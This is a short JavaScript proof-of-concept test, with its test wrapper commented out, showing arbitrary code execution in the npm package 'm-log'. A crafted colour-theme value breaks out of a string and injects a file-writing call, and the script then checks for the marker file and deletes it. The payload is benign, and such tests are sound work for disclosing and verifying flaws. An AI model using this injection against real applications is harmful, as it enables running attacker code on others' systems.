// test("Arbitrary code execution in m-log", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const log = require("m-log");
  const path = "./m-log";
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    log.setColorTheme({
      silly: 'yellow"}); require(`fs`).writeFileSync(`m-log`,``); 23//',
    });
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
